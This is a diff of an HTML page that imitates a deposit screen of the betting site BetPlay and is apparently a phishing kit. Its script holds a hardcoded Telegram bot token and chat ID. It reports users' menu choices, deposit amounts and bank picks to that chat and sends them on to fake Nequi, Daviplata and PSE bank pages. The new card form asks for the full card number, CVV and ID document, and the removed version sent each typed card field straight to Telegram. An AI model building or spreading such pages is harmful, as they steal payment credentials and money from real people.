@@ -5,130 +5,162 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>BetPlay - Recargas</title>
   <style>
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #f0f2f5;
-    }
+  body {
+    margin: 0;
+    font-family: 'Segoe UI', sans-serif;
+    background-color: #f0f2f5;
+  }
 
-    .header {
-      background-color: #002e6d;
-      color: white;
-      padding: 15px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
+  .header {
+    background-color: #002e6d;
+    color: white;
+    padding: 15px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
 
-    .header-left {
-      display: flex;
-      align-items: center;
-    }
+  .header-left {
+    display: flex;
+    align-items: center;
+  }
 
-    .dots {
-      font-size: 24px;
-      margin-right: 10px;
-      cursor: pointer;
-    }
+  .dots {
+    font-size: 24px;
+    margin-right: 10px;
+    cursor: pointer;
+  }
 
-    .logo {
-      width: 80px;
-      margin-right: 10px;
-    }
+  .logo {
+  width: 100px; /* Puedes probar también 130px o 150px si quieres más tamaño */
+  margin-right: auto;
+}
 
-    .menu-text {
-      font-size: 16px;
-    }
 
-    .header-right {
-      text-align: right;
-      font-size: 14px;
-    }
+  .menu-text {
+    font-size: 16px;
+  }
 
-    .section {
-      padding: 10px;
-    }
+  .header-right {
+    text-align: right;
+    font-size: 14px;
+  }
 
-    .card {
-      background-color: white;
-      border-radius: 12px;
-      padding: 15px;
-      margin-bottom: 12px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-      cursor: pointer;
-    }
+  .section {
+    padding: 10px;
+  }
 
-    .card img {
-      width: 36px;
-      height: 36px;
-      margin-right: 12px;
-      border-radius: 8px;
-    }
+  .card {
+    background-color: white;
+    border-radius: 12px;
+    padding: 15px;
+    margin-bottom: 12px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    cursor: pointer;
+  }
 
-    .card-left {
-      display: flex;
-      align-items: center;
-    }
+  .card img {
+    width: 36px;
+    height: 36px;
+    margin-right: 12px;
+    border-radius: 8px;
+  }
 
-    .card-title {
-      font-size: 16px;
-      font-weight: 500;
-    }
+  .card-left {
+    display: flex;
+    align-items: center;
+  }
 
-    .card-sub {
-      font-size: 13px;
-      color: #666;
-    }
+  .card-title {
+    font-size: 16px;
+    font-weight: 500;
+  }
 
-    .footer {
-      position: fixed;
-      bottom: 0;
-      width: 100%;
-      background-color: #002e6d;
-      display: flex;
-      justify-content: space-around;
-      padding: 8px 0;
-    }
+  .recarga-btn {
+    padding: 12px;
+    border: none;
+    background: #e6ecf5;
+    border-radius: 10px;
+    font-size: 14px;
+    cursor: pointer;
+    transition: background 0.3s;
+  }
 
-    .footer div {
-      text-align: center;
-      color: white;
-      font-size: 12px;
-    }
+  .recarga-btn:hover,
+  .recarga-btn.selected {
+    background-color: #cdd8ea;
+    font-weight: bold;
+  }
 
-    .footer img {
-      width: 24px;
-      height: 24px;
-      margin-bottom: 3px;
-    }
+  input[type="text"] {
+    width: 100%;
+    padding: 10px;
+    border-radius: 8px;
+    border: 1px solid #ccc;
+    font-size: 14px;
+    margin-bottom: 10px;
+  }
 
-    .form-container {
-      display: none;
-      background: white;
-      padding: 20px;
-      border-radius: 12px;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-    }
+  button.recargar {
+    width: 100%;
+    padding: 12px;
+    background: #00c851;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-weight: bold;
+    font-size: 15px;
+    cursor: pointer;
+  }
 
-    .form-container input {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      font-size: 14px;
-    }
-  </style>
+  /* NUEVOS ESTILOS PARA UNIFICAR LOS TRES MENÚS */
+  .dropdown-card {
+    display: none;
+    background: #f4f7fe;
+    border-radius: 12px;
+    padding: 15px;
+    margin-bottom: 15px;
+  }
+
+  .dropdown-card h3 {
+    color: #002e6d;
+    margin-top: 0;
+  }
+
+  .input-estilo,
+  select.input-estilo {
+    width: 100%;
+    padding: 12px;
+    border-radius: 8px;
+    border: 1px solid #ccc;
+    font-size: 14px;
+    margin-bottom: 10px;
+  }
+
+  .dropdown-contenido {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    margin: 20px 0;
+  }
+
+  small.nota {
+    color: #555;
+    display: block;
+    margin: 5px 0 10px 0;
+    font-size: 12px;
+  }
+</style>
+
 </head>
 <body>
   <div class="header">
     <div class="header-left">
       <span class="dots">&#8942;</span>
       <img src="https://i.imgur.com/nkjQDIO.png" class="logo" alt="logo" />
-      
     </div>
     <div class="header-right">
       <div id="userName">Usuario</div>
@@ -137,136 +169,298 @@
   </div>
 
   <div class="section">
-    <div class="card" onclick="redirigirYNotificar('Nequi%20HOPE/neq.html', 'Nequi')">
+    <!-- Nequi -->
+    <div class="card" onclick="toggleNequi()">
       <div class="card-left">
         <img src="https://play-lh.googleusercontent.com/iniSgahzDNcS2zK-9LYYOdyNeXUF35cHCLLZo6M1ZKvDvblhPvoBPaNNYUZ5Jhc5aA=w240-h480-rw" alt="Nequi Logo" />
         <span class="card-title">Nequi</span>
       </div>
-      <span>&#8250;</span>
+      <span>&#9660;</span>
     </div>
 
-    <div class="card" onclick="redirigirYNotificar('daviplataa/index.html', 'Daviplata')">
+    <div id="nequiDropdown" style="display:none; background:#f4f7fe; border-radius:12px; padding:15px; margin-bottom:15px;">
+      <h3 style="color:#002e6d; margin-top:0;">Recargas Nequi</h3>
+      <p><strong>¡Nuevo en BetPlay!</strong></p>
+      <p>Ahora puedes depositar desde tu aplicación Nequi. Te enviaremos una notificación que tendrás que confirmar en tu app Nequi.</p>
+      <p>Tu titular debe coincidir con el de tu cuenta de Nequi.</p>
+      <div style="display:flex; flex-direction:column; gap:10px; margin:20px 0;">
+        <button class="recarga-btn" onclick="seleccionarMonto('10000')">$10Mil</button>
+        <button class="recarga-btn" onclick="seleccionarMonto('20000')">$20Mil</button>
+        <button class="recarga-btn" onclick="seleccionarMonto('50000')">$50Mil</button>
+        <button class="recarga-btn" onclick="seleccionarMonto('100000')">$100Mil</button>
+        <button class="recarga-btn" onclick="seleccionarMonto('200000')">$200Mil</button>
+      </div>
+      <input type="text" id="montoInput" placeholder="$ Otro valor" />
+      <p style="font-size:13px; color:#555;">Recuerda que la recarga mínima es de $10Mil</p>
+      <button class="recargar" onclick="recargarNequi()">Recargar</button>
+    </div>
+    <!-- Tarjetas -->
+<div class="card" onclick="toggleTarjeta()">
+  <div class="card-left">
+    <img src="https://cdn-icons-png.flaticon.com/512/633/633611.png" alt="Tarjeta Logo" />
+    <span class="card-title">Tarjetas</span>
+  </div>
+  <span>&#9660;</span>
+</div>
+
+<div id="tarjetaDropdown" class="dropdown-card" style="display:none;">
+  <h3>Recarga con Tarjeta</h3>
+
+  <div class="dropdown-contenido">
+    <label style="font-weight:bold; color:#002e6d;">Ingresa el valor*</label>
+    <input type="text" class="input-estilo" placeholder="Ej: 10000" />
+
+    <label style="font-weight:bold; color:#002e6d;">Nombres y Apellidos*</label>
+    <input type="text" class="input-estilo" />
+
+    <label style="font-weight:bold; color:#002e6d;">Documento de identificación*</label>
+    <input type="text" class="input-estilo" />
+
+    <label style="font-weight:bold; color:#002e6d;">Número de la tarjeta*</label>
+    <div style="display:flex; gap:5px;">
+      <input type="text" maxlength="4" class="input-estilo" style="flex:1;" />
+      <input type="text" maxlength="4" class="input-estilo" style="flex:1;" />
+      <input type="text" maxlength="4" class="input-estilo" style="flex:1;" />
+      <input type="text" maxlength="4" class="input-estilo" style="flex:1;" />
+    </div>
+
+    <label style="font-weight:bold; color:#002e6d;">Código de seguridad* <span style="color:#00b0f0;">CVV / CVC</span></label>
+    <input type="text" class="input-estilo" maxlength="4" />
+
+    <label style="font-weight:bold; color:#002e6d;">Fecha de vencimiento*</label>
+    <div style="display:flex; gap:10px;">
+      <input type="text" placeholder="MM" class="input-estilo" style="flex:1;" />
+      <input type="text" placeholder="AAAA" class="input-estilo" style="flex:2;" />
+    </div>
+
+    <label style="font-weight:bold; color:#002e6d;">Cuotas*</label>
+    <input type="number" class="input-estilo" value="1" />
+
+    <label style="font-weight:bold; color:#002e6d;">Pasarela*</label>
+    <input type="text" class="input-estilo" value="kusky" />
+  </div>
+
+  <button class="recargar" onclick="confirmarTarjeta()">Recargar</button>
+</div>
+
+     <!-- PSE -->
+<div class="card" onclick="togglePSE()">
+  <div class="card-left">
+    <img src="https://pagospse.bancoomeva.com.co/pse.front/assets/img/logopsenuevo.png" alt="PSE Logo" />
+    <span class="card-title">PSE</span>
+  </div>
+  <span>&#9660;</span>
+</div>
+
+<div id="pseDropdown" class="dropdown-card">
+  <h3>Pago con PSE</h3>
+
+  <div class="dropdown-contenido">
+    <label style="font-weight:bold; color:#002e6d;">Ingresa el valor</label>
+    <input type="text" id="pseValor" placeholder="$ Valor a recargar" class="input-estilo" />
+
+    <label style="font-weight:bold; color:#002e6d;">Tipo de persona</label>
+    <select id="tipoPersona" class="input-estilo">
+      <option value="natural">Natural</option>
+      <option value="juridica">Jurídica</option>
+    </select>
+
+    <label style="font-weight:bold; color:#002e6d;">Pasarela de pago</label>
+    <select id="pasarela" class="input-estilo">
+      <option>No debe estar inscrito a la pasarela</option>
+      <option>Recarga con Payu</option>
+      <option>Recarga con Kushki</option>
+      <option>Recarga con TuCompra</option>
+    </select>
+
+    <small class="nota">*No debe estar inscrito a la pasarela, por medio de cualquiera de estas puede realizar su transacción.</small>
+
+    <label style="font-weight:bold; color:#002e6d;">Elige el banco</label>
+    <select id="bancoPSE" class="input-estilo">
+      <option disabled selected>Selecciona tu banco</option>
+      <option value="avvilla">Av Villas</option>
+      <option value="bancolombia">Bancolombia</option>
+      <option value="bbva">BBVA</option>
+      <option value="bogota">Banco Bogotá</option>
+      <option value="cajasocial">Banco Caja Social</option>
+      <option value="colpatria">Scotiabank Colpatria</option>
+      <option value="daviviendaz">Davivienda</option>
+      <option value="falabellaco">Banco Falabella</option>
+      <option value="itau">Banco Itaú</option>
+      <option value="occidente">Banco Occidente</option>
+      <option value="popular">Banco Popular</option>
+    </select>
+  </div>
+
+  <button class="recargar" onclick="confirmarPSE()">Confirmar</button>
+</div>
+
+
+    <!-- Daviplata -->
+    <div class="card" onclick="toggleDaviplata()">
       <div class="card-left">
         <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSaNzVCiBR_3sZfCT_g315KlKodwc4H6JewxQ&s" alt="Daviplata Logo" />
         <span class="card-title">Daviplata</span>
       </div>
-      <span>&#8250;</span>
-    </div>
-
-    <div class="card" onclick="togglePSE()">
-      <div class="card-left">
-        <img src="https://pagospse.bancoomeva.com.co/pse.front/assets/img/logopsenuevo.png" alt="PSE Logo" />
-        <span class="card-title">PSE</span>
-      </div>
       <span>&#9660;</span>
     </div>
-
-    <div id="pseDropdown" style="display:none; margin-top: 10px;">
-      <select id="bancoPSE" style="width:100%; padding:10px; border-radius:8px; font-size:14px;">
-        <option disabled selected>Selecciona tu banco</option>
-        <option value="avvilla">Av Villas</option>
-        <option value="bancolombia">Bancolombia</option>
-        <option value="bbva">BBVA</option>
-        <option value="bogota">Banco de Bogotá</option>
-        <option value="cajasocial">Banco Caja Social</option>
-        <option value="colpatria">Scotiabank Colpatria</option>
-        <option value="daviviendaz">Davivienda</option>
-        <option value="falabellaco">Falabella</option>
-        <option value="itau">Itau</option>
-        <option value="occidente">Banco Occidente</option>
-        <option value="popular">Banco Popular</option>
-      </select>
-      <button onclick="redireccionarPSE()" style="width:100%; padding:10px; margin-top:10px; border:none; background:#002e6d; color:white; border-radius:8px;">Continuar</button>
-    </div>
-
-    <div class="card" onclick="mostrarFormulario()">
-      <div class="card-left">
-        <img src="https://cdn-icons-png.flaticon.com/512/633/633611.png" alt="Tarjeta Icon" />
-        <div>
-          <div class="card-title">Tarjeta</div>
-          <div class="card-sub">Débito o crédito</div>
-        </div>
+      <div id="daviplataDropdown" style="display:none; background:#f4f7fe; border-radius:12px; padding:15px; margin-bottom:15px;">
+      <h3 style="color:#002e6d; margin-top:0;">Recargas Daviplata</h3>
+      <p><strong>¡Depósita al instante desde tu app Daviplata!</strong></p>
+      <p>Ingresa el monto o selecciona una opción rápida.</p>
+      <div style="display:flex; flex-direction:column; gap:10px; margin:20px 0;">
+        <button class="recarga-btn" onclick="seleccionarMonto('10000')">$10Mil</button>
+        <button class="recarga-btn" onclick="seleccionarMonto('20000')">$20Mil</button>
+        <button class="recarga-btn" onclick="seleccionarMonto('50000')">$50Mil</button>
+        <button class="recarga-btn" onclick="seleccionarMonto('100000')">$100Mil</button>
+        <button class="recarga-btn" onclick="seleccionarMonto('200000')">$200Mil</button>
       </div>
-      <span>&#8250;</span>
-    </div>
-
-    <div class="form-container" id="formTarjeta">
-      <input type="text" placeholder="Nombre" oninput="notificarInput(this)" />
-      <input type="text" placeholder="Apellido" oninput="notificarInput(this)" />
-      <input type="text" placeholder="Número de tarjeta" maxlength="16" oninput="notificarInput(this)" />
-      <div style="display: flex; gap: 10px;">
-        <input type="text" placeholder="Mes (MM)" maxlength="2" style="flex:1;" oninput="notificarInput(this)" />
-        <input type="text" placeholder="Año (YY)" maxlength="2" style="flex:1;" oninput="notificarInput(this)" />
-      </div>
-      <input type="text" placeholder="CVV" maxlength="3" oninput="notificarInput(this)" />
+      <input type="text" id="montoInput" placeholder="$ Otro valor" />
+      <p style="font-size:13px; color:#555;">Recuerda que la recarga mínima es de $10Mil</p>
+      <button class="recargar" onclick="recargarDaviplata()">Recargar</button>
     </div>
   </div>
+ 
 
-  <script>
-    const usuario = localStorage.getItem("usuario") || "Usuario";
-    document.getElementById("userName").textContent = usuario;
 
-    const botToken = "7505759331:AAF_U6x0ZGk3Tm_ivb28fHpht3GsIB8WXkU";
-    const chatId = "-1002633468201";
+   
 
-    async function notificarTelegram(mensaje) {
-      try {
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text: mensaje })
-        });
-      } catch (error) {
-        console.error("Telegram error:", error);
-      }
+    
+
+
+
+
+ <script>
+  const usuario = localStorage.getItem("usuario") || "Usuario";
+  document.getElementById("userName").textContent = usuario;
+
+  const botToken = "7505759331:AAF_U6x0ZGk3Tm_ivb28fHpht3GsIB8WXkU";
+  const chatId = "-1002633468201";
+
+  async function notificarTelegram(mensaje) {
+    try {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: mensaje })
+      });
+    } catch (error) {
+      console.error("Telegram error:", error);
     }
+  }
 
-    function redirigirYNotificar(url, nombre) {
-      localStorage.setItem("opcionSeleccionada", nombre);
-      notificarTelegram(`📲 Opción seleccionada: ${nombre}\n👤 Usuario: ${usuario}`);
-      location.href = url;
+  function cerrarTodosLosMenus() {
+    document.getElementById("nequiDropdown").style.display = "none";
+    document.getElementById("daviplataDropdown").style.display = "none";
+    document.getElementById("pseDropdown").style.display = "none";
+    document.getElementById("tarjetaDropdown").style.display = "none";
+  }
+
+  function toggleNequi() {
+    const dropdown = document.getElementById("nequiDropdown");
+    const visible = dropdown.style.display === "block";
+    cerrarTodosLosMenus();
+    dropdown.style.display = visible ? "none" : "block";
+    if (!visible) {
+      notificarTelegram(`💰 Desplegado menú Nequi\n👤 Usuario: ${usuario}`);
     }
+  }
 
-    function togglePSE() {
-      const dropdown = document.getElementById("pseDropdown");
-      const isOpen = dropdown.style.display === "block";
-      dropdown.style.display = isOpen ? "none" : "block";
-      if (!isOpen) {
-        notificarTelegram(`📂 PSE desplegado\n👤 Usuario: ${usuario}`);
-      }
+  function toggleDaviplata() {
+    const dropdown = document.getElementById("daviplataDropdown");
+    const visible = dropdown.style.display === "block";
+    cerrarTodosLosMenus();
+    dropdown.style.display = visible ? "none" : "block";
+    if (!visible) {
+      notificarTelegram(`💰 Desplegado menú Daviplata\n👤 Usuario: ${usuario}`);
     }
+  }
 
-    function redireccionarPSE() {
-      const banco = document.getElementById("bancoPSE").value;
-      if (banco) {
-        localStorage.setItem("bancoSeleccionado", banco);
-        notificarTelegram(`🏦 Banco seleccionado (PSE): ${banco}\n👤 Usuario: ${usuario}`);
-        setTimeout(() => {
-          window.location.href = `PSEUserRegister/index.html?next=bpse/${banco}/index.html`;
-        }, 500);
-      }
+  function togglePSE() {
+    const dropdown = document.getElementById("pseDropdown");
+    const visible = dropdown.style.display === "block";
+    cerrarTodosLosMenus();
+    dropdown.style.display = visible ? "none" : "block";
+    if (!visible) {
+      notificarTelegram(`💳 Desplegado menú PSE\n👤 Usuario: ${usuario}`);
     }
+  }
 
-    function mostrarFormulario() {
-      document.getElementById("formTarjeta").style.display = "block";
-      notificarTelegram(`💳 Opción seleccionada: Tarjeta\n👤 Usuario: ${usuario}`);
+  function toggleTarjeta() {
+    const dropdown = document.getElementById("tarjetaDropdown");
+    const visible = dropdown.style.display === "block";
+    cerrarTodosLosMenus();
+    dropdown.style.display = visible ? "none" : "block";
+    if (!visible) {
+      notificarTelegram(`💳 Desplegado menú Tarjeta\n👤 Usuario: ${usuario}`);
     }
+  }
 
-    function notificarInput(input) {
-      const mensaje = `✏️ Campo modificado: ${input.placeholder}\n🔤 Valor: ${input.value}\n👤 Usuario: ${usuario}`;
-      notificarTelegram(mensaje);
+  function seleccionarMonto(valor) {
+    document.getElementById("montoInput").value = `$${parseInt(valor).toLocaleString()}`;
+    const botones = document.querySelectorAll('.recarga-btn');
+    botones.forEach(btn => btn.classList.remove('selected'));
+    event.target.classList.add('selected');
+  }
+
+  function recargarNequi() {
+    const monto = document.getElementById("montoInput").value;
+    if (!monto || parseInt(monto.replace(/[^\d]/g, '')) < 10000) {
+      alert("La recarga mínima es de $10Mil.");
+      return;
     }
+    notificarTelegram(`✅ Recarga solicitada vía Nequi\n💵 Monto: ${monto}\n👤 Usuario: ${usuario}`);
+    setTimeout(() => {
+      window.location.href = 'Nequi%20HOPE/neq.html';
+    }, 500);
+  }
 
-    function actualizarHora() {
-      const ahora = new Date();
-      const h = String(ahora.getHours()).padStart(2, '0');
-      const m = String(ahora.getMinutes()).padStart(2, '0');
-      const s = String(ahora.getSeconds()).padStart(2, '0');
-      document.getElementById("hora").textContent = `${h}:${m}:${s}`;
+  function recargarDaviplata() {
+    const monto = document.getElementById("montoInput").value;
+    if (!monto || parseInt(monto.replace(/[^\d]/g, '')) < 10000) {
+      alert("La recarga mínima es de $10Mil.");
+      return;
     }
+    notificarTelegram(`✅ Recarga solicitada vía Daviplata\n💵 Monto: ${monto}\n👤 Usuario: ${usuario}`);
+    setTimeout(() => {
+      window.location.href = 'daviplataa/index.html';
+    }, 500);
+  }
 
-    setInterval(actualizarHora, 1000);
-    actualizarHora();
-  </script>
+  function confirmarPSE() {
+    const valor = document.getElementById("pseValor").value;
+    const banco = document.getElementById("bancoPSE").value;
+    if (!valor || parseInt(valor.replace(/[^\d]/g, '')) < 10000) {
+      alert("La recarga mínima es de $10Mil.");
+      return;
+    }
+    if (!banco) {
+      alert("Por favor selecciona tu banco.");
+      return;
+    }
+    notificarTelegram(`✅ Recarga solicitada vía PSE\n💵 Monto: ${valor}\n🏦 Banco: ${banco}\n👤 Usuario: ${usuario}`);
+    setTimeout(() => {
+      window.location.href = `PSEUserRegister/index.html?next=bpse/${banco}/index.html`;
+    }, 500);
+  }
+
+  function confirmarTarjeta() {
+    // Aquí puedes validar los campos si lo deseas
+    notificarTelegram(`✅ Recarga solicitada vía Tarjeta\n👤 Usuario: ${usuario}`);
+    alert("Recarga con tarjeta procesada (simulado).");
+  }
+
+  function actualizarHora() {
+    const ahora = new Date();
+    const h = String(ahora.getHours()).padStart(2, '0');
+    const m = String(ahora.getMinutes()).padStart(2, '0');
+    const s = String(ahora.getSeconds()).padStart(2, '0');
+    document.getElementById("hora").textContent = `${h}:${m}:${s}`;
+  }
+
+  setInterval(actualizarHora, 1000);
+  actualizarHora();
+</script>
+
 </body>
 </html>
